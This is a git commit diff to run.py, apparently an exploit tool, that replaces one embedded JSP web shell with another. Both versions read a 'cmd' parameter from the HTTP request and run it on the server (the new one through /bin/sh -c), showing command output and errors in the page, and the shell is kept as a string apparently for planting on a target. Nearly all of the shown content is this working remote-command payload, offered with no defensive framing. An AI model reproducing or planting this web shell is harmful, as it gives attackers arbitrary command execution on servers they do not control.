58bfcd7bbdaba1432d04bb9d2bf9660783303dab
LolMinerXmrig <108659226+lolminerxmrig@users.noreply.github.com>
2022-10-14 01:16:13 +0330

    Update run.py

--- run.py
+++ run.py
@@ -8,33 +8,37 @@ delete_warning = urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarn
 
 console = Console()
 
-shell= '''<%@ page import="java.util.*,java.io.*"%>
-
-<html>
-<body>
-    <FORM METHOD="GET" NAME="myform" ACTION="">
-    <INPUT TYPE="text" NAME="cmd">
-    <INPUT TYPE="submit" VALUE="Send">
-    </FORM>
-    <pre>
+shell= '''<%-- 
+    https://github.com/jimidk 
+    jim.maziashvili@gmail.com
+--%>
+<FORM>
+    <INPUT name='cmd' style='width:70%;' type=text>
+    <INPUT type=submit value='exec'>
+</FORM>
+<%@ page import="java.io.*" %>
     <%
-        if (request.getParameter("cmd") != null ) {
-            out.println("Command: " + request.getParameter("cmd") + "<BR>");
-            Runtime rt = Runtime.getRuntime();
-            Process p = rt.exec(request.getParameter("cmd"));
-            OutputStream os = p.getOutputStream();
-            InputStream in = p.getInputStream();
-            DataInputStream dis = new DataInputStream(in);
-            String disr = dis.readLine();
-            while ( disr != null ) {
-                out.println(disr);
-                disr = dis.readLine();
-            }
-        }
-    %>
-    </pre>
-</body>
-</html>'''
+    String cmd = request.getParameter("cmd");
+    String output = "";
+    String error = "";
+    if(cmd != null) {
+        String[] commandAndArgs = new String[]{ "/bin/sh", "-c", cmd };
+        String s = null;
+        Process process = Runtime.getRuntime().exec(commandAndArgs);
+        InputStream inputStream = process.getInputStream();
+        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
+        Thread.sleep(2000);
+        while(process.isAlive()) Thread.sleep(100);
+        while((s = reader.readLine()) != null) { output += s+"&#13;&#10;"; }
+        reader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
+        while((s = reader.readLine()) != null) { error += s+"&#13;&#10;"; }
+    }
+%>
+cmd: <%=cmd %><br>
+output:<br>
+<textarea style="width:100%; height: 50%"><%=output %></textarea>
+error:<br>
+<textarea style="width:100%; height: 30%"><%=error %></textarea>'''
 
 public_key = '''KEY'''
 
